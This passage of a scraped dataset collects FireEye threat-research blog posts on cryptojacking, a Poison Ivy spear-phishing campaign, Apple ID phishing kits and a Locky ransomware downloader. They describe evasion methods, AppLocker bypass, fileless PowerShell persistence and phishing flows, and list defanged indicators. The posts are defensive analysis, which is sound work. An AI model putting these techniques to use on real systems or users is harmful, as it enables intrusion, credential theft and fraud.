mobile devices for cryptojacking operations. While this technique is less common, likely due to the limited processing power afforded by mobile devices, cryptojacking on mobile devices remains a threat as sustained power consumption can damage the device and dramatically shorten the battery life. Threat actors have been observed targeting mobile devices by hosting malicious cryptojacking apps on popular app stores and through drive-by malvertising campaigns that identify users of mobile browsers. The following are some real-world examples of mobile devices being used for cryptojacking: During 2014, FireEye iSIGHT Intelligence reported on multiple Android malware apps capable of mining cryptocurrency: In March 2014, Android malware named \"CoinKrypt\" was discovered, which mined Litecoin, Dogecoin, and CasinoCoin currencies. In March 2014, another form of Android malware – \"Android.Trojan.MuchSad.A\" or \"ANDROIDOS_KAGECOIN.HBT\" – was observed mining Bitcoin, Litecoin, and Dogecoin currencies. The malware was disguised as copies of popular applications, including \"Football Manager Handheld\" and \"TuneIn Radio.\" Variants of this malware have reportedly been downloaded by millions of Google Play users. In April 2014, Android malware named \"BadLepricon,\" which mined Bitcoin, was identified. The malware was reportedly being bundled into wallpaper applications hosted on the Google Play store, at least several of which received 100 to 500 installations before being removed. In October 2014, a type of mobile malware called \"Android Slave\" was observed in China; the malware was reportedly capable of mining multiple virtual currencies. In December 2017, researchers with Kaspersky Labs reported on a new multi-faceted Android malware capable of a variety of actions including mining cryptocurrencies and launching DDoS attacks. The resource load created by the malware has reportedly been high enough that it can cause the battery to bulge and physically destroy the device. The malware, dubbed Loapi, is unique in the breadth of its potential actions. It has a modular framework that includes modules for malicious advertising, texting, web crawling, Monero mining, and other activities. Loapi is thought to be the work of the same developers behind the 2015 Android malware Podec, and is usually disguised as an anti-virus app. In January 2018, SophosLabs released a report detailing their discovery of 19 mobile apps hosted on Google Play that contained embedded Coinhive-based cryptojacking code, some of which were downloaded anywhere from 100,000 to 500,000 times. Between November 2017 and January 2018, researchers with Malwarebytes Labs reported on a drive-by cryptojacking campaign that affected millions of Android mobile browsers to mine Monero. Cryptojacking Spam Campaigns FireEye iSIGHT Intelligence has observed several cryptocurrency miners distributed via spam campaigns, which is a commonly used tactic to indiscriminately distribute malware. We expect malicious actors will continue to use this method to disseminate cryptojacking code as for long as cryptocurrency mining remains profitable. In late November 2017, FireEye researchers identified a spam campaign delivering a malicious PDF attachment designed to appear as a legitimate invoice from the largest port and container service in New Zealand: Lyttelton Port of Chistchurch (Figure 9). Once opened, the PDF would launch a PowerShell script that downloaded a Monero miner from a remote host. The malicious miner connected to the pools supportxmr.com and nanopool.org. Figure 9: Sample lure attachment (PDF) that downloads malicious cryptocurrency miner Additionally, a massive cryptojacking spam campaign was discovered by FireEye researchers during January 2018 that was designed to look like legitimate financial services-related emails. The spam email directed victims to an infection link that ultimately dropped a malicious ZIP file onto the victim's machine. Contained within the ZIP file was a cryptocurrency miner utility (MD5: 80b8a2d705d5b21718a6e6efe531d493) configured to mine Monero and connect to the minergate.com pool. While each of the spam email lures and associated ZIP filenames were different, the same cryptocurrency miner sample was dropped across all observed instances (Table 2). ZIP Filenames california_540_tax_form_2013_instructions.exe state_bank_of_india_money_transfer_agency.exe format_transfer_sms_banking_bni_ke_bca.exe confirmation_receipt_letter_sample.exe sbi_online_apply_2015_po.exe estimated_tax_payment_coupon_irs.exe how_to_add_a_non_us_bank_account_to_paypal.exe western_union_money_transfer_from_uk_to_bangladesh.exe can_i_transfer_money_from_bank_of_ireland_to_aib_online.exe how_to_open_a_business_bank_account_with_bad_credit_history.exe apply_for_sbi_credit_card_online.exe list_of_lucky_winners_in_dda_housing_scheme_2014.exe Table 2: Sampling of observed ZIP filenames delivering cryptocurrency miner Cryptojacking Worms Following the WannaCry attacks, actors began to increasingly incorporate self-propagating functionality within their malware. Some of the observed self-spreading techniques have included copying to removable drives, brute forcing SSH logins, and leveraging the leaked NSA exploit EternalBlue . Cryptocurrency mining operations significantly benefit from this functionality since wider distribution of the malware multiplies the amount of CPU resources available to them for mining. Consequently, we expect that additional actors will continue to develop this capability. The following are some real-world examples of cryptojacking worms: In May 2017, Proofpoint reported a large campaign distributing mining malware \"Adylkuzz.\" This cryptocurrency miner was observed leveraging the EternalBlue exploit to rapidly spread itself over corporate LANs and wireless networks. This activity included the use of the DoublePulsar backdoor to download Adylkuzz. Adylkuzz infections create botnets of Windows computers that focus on mining Monero. Security researchers with Sensors identified a Monero miner worm, dubbed \"Rarogminer,\" in April 2018 that would copy itself to removable drives each time a user inserted a flash drive or external HDD. In January 2018, researchers at F5 discovered a new Monero cryptomining botnet that targets Linux machines. PyCryptoMiner is based on Python script and spreads via the SSH protocol. The bot can also use Pastebin for its command and control (C2) infrastructure. The malware spreads by trying to guess the SSH login credentials of target Linux systems. Once that is achieved, the bot deploys a simple base64-encoded Python script that connects to the C2 server to download and execute more malicious Python code. Detection Avoidance Methods Another trend worth noting is the use of proxies to avoid detection. The implementation of mining proxies presents an attractive option for cyber criminals because it allows them to avoid developer and commission fees of 30 percent or more. Avoiding the use of common cryptojacking services such as Coinhive, Cryptloot, and Deepminer, and instead hosting cryptojacking scripts on actor-controlled infrastructure, can circumvent many of the common strategies taken to block this activity via domain or file name blacklisting. In March 2018, Bleeping Computer reported on the use of cryptojacking proxy servers and determined that as the use of cryptojacking proxy services increases, the effectiveness of ad blockers and browser extensions that rely on blacklists decreases significantly. Several mining proxy tools can be found on GitHub, such as the XMRig Proxy tool, which greatly reduces the number of active pool connections, and the CoinHive Stratum Mining Proxy , which uses Coinhive’s JavaScript mining library to provide an alternative to using official Coinhive scripts and infrastructure. In addition to using proxies, actors may also establish their own self-hosted miner apps, either on private servers or cloud-based servers that supports Node.js. Although private servers may provide some benefit over using a commercial mining service, they are still subject to easy blacklisting and require more operational effort to maintain. According to Sucuri researchers , cloud-based servers provide many benefits to actors looking to host their own mining applications, including: Available free or at low-cost No maintenance, just upload the crypto-miner app Harder to block as blacklisting the host address could potentially impact access to legitimate services Resilient to permanent takedown as new hosting accounts can more easily be created using disposable accounts The combination of proxies and crypto-miners hosted on actor-controlled cloud infrastructure presents a significant hurdle to security professionals, as both make cryptojacking operations more difficult to detect and take down. Mining Victim Demographics Based on data from FireEye detection technologies, the detection of cryptocurrency miner malware has increased significantly since the beginning of 2018 (Figure 10), with the most popular mining pools being minergate and nanopool (Figure 11), and the most heavily affected country being the U.S. (Figure 12). Consistent with other reporting , the education sector remains most affected, likely due to more relaxed security controls across university networks and students taking advantage of free electricity to mine cryptocurrencies (Figure 13). Figure 10: Cryptocurrency miner detection activity per month Figure 11: Commonly observed pools and associated ports Figure 12: Top 10 affected countries Figure 13: Top five affected industries Figure 14: Top affected industries by country Mitigation Techniques Unencrypted Stratum Sessions According to security researchers at Cato Networks, in order for a miner to participate in pool mining, the infected machine will have to run native or JavaScript-based code that uses the Stratum protocol over TCP or HTTP/S. The Stratum protocol uses a publish/subscribe architecture where clients will send subscription requests to join a pool and servers will send messages (publish) to its subscribed clients. These messages are simple, readable, JSON-RPC messages. Subscription requests will include the following entities: id, method, and params (Figure 15). A deep packet inspection (DPI) engine can be configured to look for these parameters in order to block Stratum over unencrypted TCP. Figure 15: Stratum subscription request parameters Encrypted Stratum Sessions In the case of JavaScript-based miners running Stratum over HTTPS, detection is more difficult for DPI engines that do not decrypt TLS traffic. To mitigate encrypted mining traffic on a network, organizations may blacklist the IP addresses and domains of popular mining pools. However, the downside to this is identifying and updating the blacklist, as locating a reliable and continually updated list of popular mining pools can prove difficult and time consuming. Browser-Based Sessions Identifying and detecting websites that have embedded coin mining code can be difficult since not all coin mining scripts are authorized by website publishers (as in the case of a compromised website). Further, in cases where coin mining scripts were authorized by a website owner, they are not always clearly communicated to site visitors. As defenses evolve to prevent unauthorized coin mining activities, so will the techniques used by actors; however, blocking some of the most common indicators that we have observed to date may be effective in combatting a significant amount of the CPU-draining mining activities that customers have reported. Generic detection strategies for browser-based cryptocurrency mining include: Blocking domains known to have hosted coin mining scripts Blocking websites of known mining project websites, such as Coinhive Blocking scripts altogether Using an ad-blocker or coin mining-specific browser add-ons Detecting commonly used naming conventions Alerting and blocking traffic destined for known popular mining pools Some of these detection strategies may also be of use in blocking some mining functionality included in existing financial malware as well as mining-specific malware families. It is important to note that JavaScript used in browser-based cryptojacking activity cannot access files on disk. However, if a host has inadvertently navigated to a website hosting mining scripts, we recommend purging cache and other browser data. Outlook In underground communities and marketplaces there has been significant interest in cryptojacking operations, and numerous campaigns have been observed and reported by security researchers. These developments demonstrate the continued upward trend of threat actors conducting cryptocurrency mining operations, which we expect to see a continued focus on throughout 2018. Notably, malicious cryptocurrency mining may be seen as preferable due to the perception that it does not attract as much attention from law enforcement as compared to other forms of fraud or theft. Further, victims may not realize their computer is infected beyond a slowdown in system performance. Due to its inherent privacy-focused features and CPU-mining profitability, Monero has become one of the most attractive cryptocurrency options for cyber criminals. We believe that it will continue to be threat actors' primary cryptocurrency of choice, so long as the Monero blockchain maintains privacy-focused standards and is ASIC-resistant. If in the future the Monero protocol ever downgrades its security and privacy-focused features, then we assess with high confidence that threat actors will move to use another privacy-focused coin as an alternative. Because of the anonymity associated with the Monero cryptocurrency and electronic wallets, as well as the availability of numerous cryptocurrency exchanges and tumblers, attribution of malicious cryptocurrency mining is very challenging for authorities, and malicious actors behind such operations typically remain unidentified. Threat actors will undoubtedly continue to demonstrate high interest in malicious cryptomining so long as it remains profitable and relatively low risk. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2017-02-22",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction FireEye recently observed a sophisticated campaign targeting individuals within the Mongolian government. Targeted individuals that enabled macros in a malicious Microsoft Word document may have been infected with Poison Ivy , a popular remote access tool (RAT) that has been used for nearly a decade for key logging, screen and video capture, file transfers, password theft, system administration, traffic relaying, and more. The threat actors behind this attack demonstrated some interesting techniques, including: Customized evasion based on victim profile – The campaign used a publicly available technique to evade AppLocker application whitelisting applied to the targeted systems. Fileless execution and persistence – In targeted campaigns, threat actors often attempt to avoid writing an executable to the disk to avoid detection and forensic examination. The campaign we observed used four stages of PowerShell scripts without writing the the payloads to individual files. Decoy documents – This campaign used PowerShell to download benign documents from the Internet and launch them in a separate Microsoft Word instance to minimize user suspicion of malicious activity. Attack Cycle The threat actors used social engineering to convince users to run an embedded macro in a Microsoft Word document that launched a malicious PowerShell payload. The threat actors used two publicly available techniques, an AppLocker whitelisting bypass and a script to inject shellcode into the userinit.exe process. The malicious payload was spread across multiple PowerShell scripts, making its execution difficult to trace. Rather than being written to disk as individual script files, the PowerShell payloads were stored in the registry. Figure 1 shows the stages of the payload execution from the malicious macro. Figure 1: Stages of payload execution used in this attack Social Engineering and Macro-PowerShell Level 1 Usage Targets of the campaign received Microsoft Word documents via email that claimed to contain instructions for logging into webmail or information regarding a state law proposal. When a targeted user opens the malicious document, they are presented with the messages shown in Figure 2, asking them to enable macros. Figure 2: Lure suggesting the user to enable Macros to see content Bypassing Application Whitelisting Script Protections (AppLocker) Microsoft application whitelisting solution AppLocker prevents unknown executables from running on a system. In April 2016, a security researcher demonstrated a way to bypass this using regsvr32.exe, a legitimate Microsoft executable permitted to execute in many AppLocker policies. The regsvr32.exe executable can be used to download a Windows Script Component file (SCT file) by passing the URL of the SCT file as an argument. This technique bypasses AppLocker restrictions and permits the execution of code within the SCT file. We observed implementation of this bypass in the macro code to invoke regsvr32.exe, along with a URL passed to it which was hosting a malicious SCT file, as seen in Figure 3. Figure 3:  Command after de-obfuscation to bypass AppLocker via regsv32.exe Figure 4 shows the entire command line parameter used to bypass AppLocker. Figure 4: Command line parameter used to bypass AppLocker We found that the malicious SCT file invokes WScript to launch PowerShell in hidden mode with an encoded command, as seen in Figure 5. Figure 5: Content of SCT file containing code to launch encoded PowerShell Decoding SCT: Decoy launch and Stage Two PowerShell After decoding the PowerShell command, we observed another layer of PowerShell instructions, which served two purposes: 1.     There was code to download a decoy document from the Internet and open it in a second winword.exe process using the Start-Process cmdlet. When the victim enables macros, they will see the decoy document shown in Figure 6. This document contains the content described in the spear phishing email. Figure 6: Decoy downloaded and launched on the victim’s screen 2.     After launching the decoy document in the second winword.exe process, the PowerShell script downloads and runs another PowerShell script named f0921.ps1 as shown in Figure 7. Figure 7: PowerShell to download and run decoy decoy document and third-stage payload Third Stage PowerShell Persistence The third stage PowerShell script configures an encoded PowerShell command persistently as base64 string in the HKCU: \\Console\\FontSecurity registry key. Figure 8 shows a portion of the PowerShell commands for writing this value to the registry. Figure 8: Code to set registry with encoded PowerShell script Figure 9 shows the registry value containing encoded PowerShell code set on the victims’ system. Figure 9: Registry value containing encoded PowerShell script Figure 10 shows that using Start-Process, PowerShell decodes this registry and runs the malicious code. Figure 10: Code to decode and run malicious content from registry The third stage PowerShell script also configures another registry value  named HKCU\\CurrentVersion\\Run\\SecurityUpdate to launch the encoded PowerShell payload stored in the HKCU: \\Console\\FontSecurity key. Figure 11 shows the code for these actions. This will execute the PowerShell payload when the user logs in to the system. Figure 11: PowerShell registry persistence Fourth Stage PowerShell Inject-LocalShellCode The HKCU\\Console\\FontSecurity registry contains the fourth stage PowerShell script, shown decoded in Figure 12. This script borrows from the publicly available Inject-LocalShellCode PowerShell script from PowerSploit to inject shellcode. Figure 12: Code to inject shellcode Shellcode Analysis The shellcode has a custom XOR based decryption loop that uses a single byte key (0xD4), as seen in Figure 13. Figure 13: Decryption loop and call to decrypted shellcode After the shellcode is decrypted and run, it injects a Poison Ivy backdoor into the userinit.exe as shown in Figure 14. Figure 14: Code injection in userinit.exe and attempt to access Poison Ivy related DAT files In the decrypted shellcode, we also observed content and configuration related to Poison Ivy.  Correlating these bytes to the standard configuration of Poison Ivy, we can observe the following: Active setup – StubPath Encryption/Decryption key - version2013 Mutex name - 20160509 The Poison Ivy configuration dump is shown in Figure 15. Figure 15: Poison Ivy configuration dump Conclusion Although Poison Ivy has been a proven threat for some time, the delivery mechanism for this backdoor uses recent publicly available techniques that differ from previously observed campaigns. Through the use of PowerShell and publicly available security control bypasses and scripts, most steps in the attack are performed exclusively in memory and leave few forensic artifacts on a compromised host. FireEye HX Exploit Guard is a behavior-based solution that is not affected by the tricks used here. It detects and blocks this threat at the initial level of the attack cycle when the malicious macro attempts to invoke the first stage PowerShell payload. HX also contains generic detections for the registry persistence, AppLocker bypasses and subsequent stages of PowerShell abuse used in this attack. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/06/rotten_apples_apple.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2016-06-07",
                    "source": "www.fireeye.com"
                },
                "text": "At FireEye Labs we have an automated system designed to proactively detect newly registered malicious domains. This system observed some phishing domains registered in the first quarter of 2016 that were designed to appear as legitimate Apple domains. These phony Apple domains were involved in phishing attacks against Apple iCloud users in China and UK. In the past we have observed several phishing domains targeting Apple, Google and Yahoo users; however, these campaigns are unique as they are serving the same malicious phishing content from different domains to target Apple users. Since January 2016 we have observed several phishing campaigns targeting the Apple IDs and passwords of Apple users. Apple provides all of its customers with an Apple ID, a centralized personal account that gives access to iCloud and other Apple features and services such as the iTunes Store and App Store. Users will provide their Apple ID to sign in to iCloud[.]com, and use the same Apple ID to set up iCloud on their iPhone, iPad, iPod Touch, Mac, or Windows computer. iCloud ensures that users always have the latest versions of their important information –  including documents, photos, notes, and contacts – on all of their Apple devices. iCloud provides an easy interface to share photos, calendars, locations and more with friends and family, and even helps users find their device if they lose it. Perhaps most importantly, its iCloud Keychain feature allows user to store passwords and credit card information and have it entered automatically on their iOS devices and Mac computers. Anyone with access to an Apple ID, password and some additional information, such as date of birth and device screen lock code, can completely take over the device and use the credit card information to impersonate the user and make purchases via the Apple Store. This blog highlights some highly organized and sophisticated phishing attack campaigns we observed targeting Apple customers. Campaign 1: Zycode phishing campaign targeting Apple's Chinese Customers This phishing kit is named “zycode” after the value of a password variable embedded in the JavaScript code which all these domains serve in their HTTP responses. The following is a list of phishing domains targeting Apple users detected by our automated system in March 2016. None of these domains are registered by Apple, nor are they pointing to Apple infrastructure: The list shows that the attackers are attempting to mimic websites related to iTunes, iCloud and Apple ID, which are designed to lure and trick victims into submitting their Apple IDs. Most of these domains appeared as an Apple login interface for Apple ID, iTunes and iCloud. The domains were serving highly sophisticated, obfuscated and suspicious JavaScripts, which was creating the phishing HTML content on the web page. This technique is effective against anti-phishing systems that rely on the HTML content and analyze the forms. From March 7 to March 12, the following domains used for Apple ID phishing were observed, all of which were registered by a few entities in China using a qq[.]com email address: iCloud-Apple-apleid[.]com, Appleid-xyw[.]com, itnues-appid[.]com, AppleidApplecwy[.]com, appie-itnues[.]com, AppleidApplecwy[.]com, Appleid-xyw[.]com, Appleid-yun-iCloud[.]com, iCloud-Apple-apleid[.]com, iphone-ioslock[.]com, iphone-appdw[.]com. From March 13 to March 20, we observed these new domains using the exact same phishing content, and having similar registrants: iCloud-Appleid-yun[.]win, iClouddd[.]top, iCloudee[.]top, iCloud-findip[.]com, iCloudhh[.]top, ioslock-Apple[.]com, ioslock-iphone[.]com, iphone-iosl0ck[.]com, lcloudmid[.]com On March 30, we observed the following newly registered domains serving this same content: iCloud-mail-Apple[.]com, Apple-web-icluod[.]com, Apple-web-icluodid[.]com, AppleidAppleiph[.]com , icluod-web-ios[.]com and ios-web-Apple[.]com Phishing Content and Analysis Phishing content is usually available in the form of simple HTML, referring to images that mimic a target brand and a form to collect user credentials. Phishing detection systems look for special features within the HTML content of the page, which are used to develop detection heuristics. This campaign is unique as a simple GET request to any of these domains results in an encoded JavaScript content in the response, which does not reveal its true intention unless executed inside a web browser or a JavaScript emulator. For example, the following is a brief portion of the encoded string taken from the code. This encoded string strHTML goes through a complex sequence of around 23 decrypting/decoding functions that include number system conversions, pseudo-random pattern modifiers followed by XOR decoding using a fixed key or password “zycode” for the actual HTML phishing content to be finally created (refer to Figure 15 and Figure 16 in Appendix 1 for complete code). Phishing detection systems that rely solely on the HTML in the response section will completely fail to detect the code generated using this technique. Once loaded into the web browser, this obfuscated JavaScript creates an iCloud phishing page. This page is shown in Figure 1. Figure 1: The page created by the obfuscated JavaScript as displayed in the browse r The page is created by the de-obfuscated content seen in Figure 2. Figure 2: Deobfuscated conten t Burp Suite is a tool to secure and penetrate web applications: https://portswigger[.]net/burp/.  The Burp session of a user supplying login and password to the HTML form is shown in Figure 3. Here we can see 5 variables (u,p,x,y and cc) and a cookie being sent via HTTP POST method to the page save.php. Figure 3: Burp sessio n After the user enters a login and password, they are redirected and presented with the following Chinese Apple page, seen in Figure 4: http://iClouddd[.]top/ask2.asp?MNWTK=25077126670584.html Figure 4: Phishing pag e On this page, all the links correctly point towards Apple[.]com, as can be seen in the HTML: * Apple <http://www.Apple[.]com/cn/> * <http://www.Apple[.]com/cn/shop/goto/bag> * Apple <http://www.Apple[.]com/cn/> * Mac <http://www.Apple[.]com/cn/mac/> * iPad <http://www.Apple[.]com/cn/ipad/> * iPhone <http://www.Apple[.]com/cn/iphone/> * Watch <http://www.Apple[.]com/cn/watch/> * Music <http://www.Apple[.]com/cn/music/> * <http://www.Apple[.]com/cn/support/> * Apple[.]com <http://www.Apple[.]com/cn/search> * <http://www.Apple[.]com/cn/shop/goto/bag> Apple ID <https://Appleid.Apple[.]com/account/home> * <https://Appleid.Apple[.]com/zh_CN/signin> * Apple ID <https://Appleid.Apple[.]com/zh_CN/account> * <https://Appleid.Apple[.]com/zh_CN/#!faq> When translated using Google Translate, the Chinese text written in the middle of the page (Figure 4) reads: “Verify your birth date or your device screen lock to continue”. Next the user was presented with an ask3.asp webpage shown in Figure 5. Figure 5: Phishing form asking for more details from victim s Translation: “Please verify your security question” As shown in Figure 5, the page asks the user to answer three security questions, followed by redirection to an ok.asp page (Figure 6) on the same domain: Figure 6: Successful submission phishing pag e The final link points back to Apple[.]com. The complete trail using Burp suite tool is shown in Figure 7. Figure 7: Burp ses sion We noticed that if the user tried to supply the same Apple ID twice, they got redirected to the page save[.]asp shown in Figure 8. Clicking OK on the popup redirected the user back to the main page. Figure 8: Error prompt generated by phishing page Domain Registration Information We found that the registrant names for all of these phony Apple domains were these Chinese names: “ Yu Hu” and “Wu Yan”, “Yu Fei” and “Yu Zhe”. Moreover, all these domains were registered with qq[.].com email addresses. Details are available in Table 1 below. Table 1: Domain registration information Looking closer at our malicious domain detection system, we observed that the system had been seeing similar domains at an increasing frequency. Analyzing the registration information, we found some interesting patterns. Since January 2016 to the time of writing, the system marked around 240 unique domains that have something to do with Apple ID, iCloud or iTunes. From these 240 domains , we identified 154 unique email registrants with 64 unique emails pointing to qq[.]com, 36 unique Gmail email accounts, and 18 unique email addresses each belonging to 163[.]com and 126[.]com, and a couple more registered with 139[.]com. This information is vital, as it could be used in following different ways: The domain list provided here could be used by Apple customers as a blacklist; they can avoid browsing to such domains and providing credentials to any of the listed domains, whether they receive them via SMS, email or via any instant messaging service. The Apple credential phishing detection teams could use this information, as it highlights that all domains registered with these email addresses, registrant names and addresses, as well as their combinations, are potentially malicious and serving phishing content. This information could be used to block all future domains registered by the same entities. Patterns emerging from this data reveal that for such campaigns, attackers prefer to use email addresses from Chinese services such as qq.com, 126.com and 138.com. It has also been observed that instead of names, the attackers have used numbers (such as 545454@qq[.]com and 891495200@qq[.]com) in their email addresses. Geo-location: As seen in Figure 9, we observed all of these domains pointing to 13 unique IP addresses distributed across the U.S. and China, suggesting that these attacks were perhaps targeting users from these regions . Figure 9: Geo-location plot of the IPs for this camp aign Campaign 2: British Apples Gone Bad Our email attacks research team unearthed another targeted phishing campaign against Apple users in the UK. Table 2 is a list of 86 Apple phishing domains that we observed since January 2016. Figure 9: Geo-location plot of the IPs for this campaign Phishing Content and Analysis All of these domains have been serving the same phishing content. A simple HTTP GET (via the wget utility) to the domain’s main page reveals HTML code containing a meta-refresh redirection to the signin.php page. A wget session is shown here: $ wget http://manageAppleid84913[.]net --2016-04-05 16:47:44--  http://manageAppleid84913[.]net/ Resolving manageAppleid84913[.]net (manageAppleid84913[.]net)... 109.123.121.10 Connecting to manageAppleid84913[.]net (manageAppleid84913[.]net)|109.123.121.10|:80... connected. HTTP request sent, awaiting response... 200 OK Length: 203 [text/html] Saving to: ‘index.html.1’ 100%[============================================================================================================>] 203         --.-K/s   in 0s 2016-04-05 16:47:44 (37.8 MB/s) - ‘index.html.1’ saved [203/203] Content of the page is displayed here: <meta http-equiv=\"refresh\" content=\"0;URL=signin.php?c=ODcyNTA5MTJGUjU0OTYwNTQ5NDc3MTk3NTAxODE2ODYzNDgxODg2NzU3NA==&log=1&sFR=ODIxNjMzMzMxODA0NTE4MTMxNTQ5c2RmZ3M1ZjRzNjQyMDQzNjgzODcyOTU2MjU5&email=\" /> This code redirects the browser to this URL/page: http://manageAppleid84913[.]net/signin.php?c=OTYwNzUyNjlGUjU0OTYwNTQ5NDY0MDgxMjQ4OTQ5OTk0MTQ3MDc1NjYyOA==&log=1&sFR=ODc0MjQyNTEyNzMyODE1NTMxNTQ5c2RmZ3M1ZjRzNjQzMDU5MjUzMzg4NDMzNzE1&email=# This loads a highly obfuscated JavaScript in the web browser that, on execution, generates the phishing HTML code at runtime to evade signature-based phishing detection systems. This is seen in Figure 17 in Appendix 2, with a deobfuscated version of the HTML code being shown in Figure 18. This code renders in the browser to create the fake Apple ID phishing webpage seen in Figure 10, which resembles the authentic Apple page https://Appleid.Apple[.]com/ . Figure 10: Screenshot of the phishing page as seen by the victims in the bro wser On submitting a fake username and password, the form gets submitted to signin-box-disabled.php and the JavaScript and jQuery creates the page seen in Figure 11, informing the user that the Apple ID provided has been locked and the user must unlock it: Figure 11: Phishing page suggesting victims to unlock their Apple IDs , which requests personal information such as name, date of birth, telephone numbers, addresses, credit card details and security questions, as shown in Figure 12. While filling out this form, we observed that the country part of the address drop-down menu only allowed address options from England, Scotland and Wales, suggesting that this attack is targeting these regions onlyClicking on unlock leads the user to the page profile.php . Figure 12: User information requested by phishing page On submitting false information on this form, the user would get a page asking to wait while the entered information is confirmed or verified. After a couple of seconds of processing, the page congratulates the user that their Apple ID was successfully unlocked (Figure 13). As seen in Figure 14, the user is then redirected to the authentic Apple page at https://Appleid.Apple[.]com/ . Figure 13: Account verification page displayed by the phishing site Figure 14: After a successful attack, victims are redirected to the real apple login page Domain Registration Information It was observed that all of these domains used the whois privacy protection feature offered by many registrars. This feature enables the registrants to hide their personal and contact information which otherwise is available via the whois service. These domains were registered with the email “ contact@privacyprotect[.]org ” Geo-location All these domains (Table 2) were pointing to IPs in the UK, suggesting that they were hosted in the UK. Conclusion Cybercriminals are targeting Apple users by launching phishing campaigns focused on stealing Apple IDs, as well as personal, financial and other information. We witnessed a high frequency of these targeted phishing attacks in the first quarter of 2016. A few phishing campaigns were particularly interesting because of their sophisticated evasion techniques (using code encoding and obfuscation), geographical targets, and because the same content was being served across multiple domains, which indicates the same phishing kits were being used. One campaign we detected in March used sophisticated encoding/encryption techniques to evade phishing detection systems and provided a realistic looking Apple/iCloud interface. The majority of these domains were registered by individuals having email addresses pointing to Chinese services – registrant email, contact and address information points to China. Additionally, the domains were serving phony Apple webpages in Chinese, indicating that they were targeting Chinese users. The second campaign we detected was launched against Apple users in the UK. This campaign used sophisticated evasion techniques (such as code obfuscation) to evade phishing detection systems and, whenever successful, was able to collect Apple IDs and personal and credit card information from its victims. Organizations could use the information provided in this blog to protect their users from such sophisticated phishing campaigns by writing signatures for their phishing detection and prevention systems. Credits and Acknowledgements Special thanks to Yichong Lin, Jimmy Su, Mary Grace and Gaurav Dalal for their support. Appendix 1 Figure 15: Obfuscated JavaScript served by the phishing site. In Green we have highlighted functions with: number system converters, pseudo-random pattern decoders, bit level binary operas Figure 16: Obfuscated JS served by the phishing site. In Green we have highlighted functions with: number system converters, pseudo-random pattern decoders, bit level binary operaters. While in Red we have: XOR deco ders. Appendix 2 Figure 17: Obfuscated JavaScript content served by the site Figure 18: Deobfuscated HTML content For more information on phishing, please visit: https://support.apple.com/HT203126 http://www.apple.com/legal/more-resources/phishing/ https://support.apple.com/HT204759 Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/06/locky-is-back-and-asking-for-unpaid-debts.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2016-06-24",
                    "source": "www.fireeye.com"
                },
                "text": "On June 21, 2016, FireEye’s Dynamic Threat Intelligence (DTI) identified an increase in JavaScript contained within spam emails. FireEye analysts determined the increase was the result of a new Locky ransomware spam campaign. As shown in Figure 1, Locky spam activity was uninterrupted until June 1, 2016, when it stopped for nearly three weeks. During this period, Locky was the most dominant ransomware distributed in spam email. Now, Locky distribution has returned to the level seen during the first half of 2016. Figure 1. Locky spam activity in 2016 Figure 2 shows that the majority of Locky spam email detections between June 21 and June 23 of this year were recorded in Japan, the United States and South Korea. Figure 2. Locky spam by country from June 21 to June 23 of this year The spam email – a sample shown is shown in Figure 3 – purports to contain an unpaid invoice in an attached ZIP archive. Instead of an invoice, the ZIP archive contains a Locky downloader written in JavaScript. Figure 3. Locky spam email JavaScript based Downloader Updates In this campaign, few updates were seen in both the JavaScript based downloader and the Locky payload. The JavaScript downloader does the following: Iterates over an array of URLs hosting the Locky payload. If a connection to one of the URLs fails, the JavaScript sleeps for 1,000 ms before continuing to iterate over the array of URLs. Uses a custom XOR-based decryption routine to decrypt the Locky payload. Ensures the decrypted binary is of a predefined size. In Figure 4 below, the size of the decrypted binary had to be greater than 143,360 bytes and smaller than 153,660 bytes to be executed. Figure 4. Payload download function in JavaScript 5.     Checks (Figure 5) that the first two bytes of the binary contain the “MZ” header signature. Figure 5: MZ header check 6.     Executes the decrypted payload by passing it the command line parameter, “123”. Locky Payload Updates The Locky ransomware downloaded in this campaign requires a command line argument to properly execute. This command line parameter, “123” in the analyzed sample, is passed to the binary by the first stage JavaScript-based downloader. This command line parameter value is used in the code unpacking stage of the ransomware. Legitimate binaries typically verify the number of arguments passed or compare the command line parameter with the expected value and gracefully exit if the check fails. However in the case of this Locky ransomware, the program does not exit (Figure 6) and the value received as a command line parameter is added to a constant value defined in the binary. The sum of the constant and the parameter value is used in the decryption routine (Figure 7). If no command line parameter is passed, it adds zero to the constant. Figure 6. Command line parameter check Figure 7. Decryption routine If no command line parameter is passed, then the constant for the decryption routine is incorrect. This results in program crash as the decrypted code is invalid. In Figure 8 and Figure 9, we can see the decrypted code sections with and without the command line parameter, respectively. Figure 8. Correct decrypted code Figure 9. Incorrect decrypted code By using this technique, Locky authors have created a dependency on the first stage downloader for the second stage to be executed properly. If a second stage payload such as this is directly analyzed, it will result in a crash. Conclusion As of today, the Locky spam campaign is still ongoing, with an added anti-analysis / sandbox evasion technique. We expect to see additional Locky spam campaigns and will remain vigilant in order to protect our customers. Email Hashes 2cdf62f8aae20026418f143895c769a2009e6b9b3ac59bfa8fc79ca2f326b93a 1fd5c1f0ecc1d54324f3bdc327e7893032482a13c0914ef6f531bd93caef0a06 0ea7d59d7f1494fce8f45a1f35abb07a456de6d8d65327eca8ff84f307a49a06 22645be8553628574a7af3c32a45178e201e9af33b20b36d29b9c012b731da4c 198d8d1a89221c575d957c1f4342741f3675ebb10f95ffe3371150e124f4850e Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/01/hot_or_not_the_bene.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2016-01-27",
                    "source": "www.fireeye.com"
                },
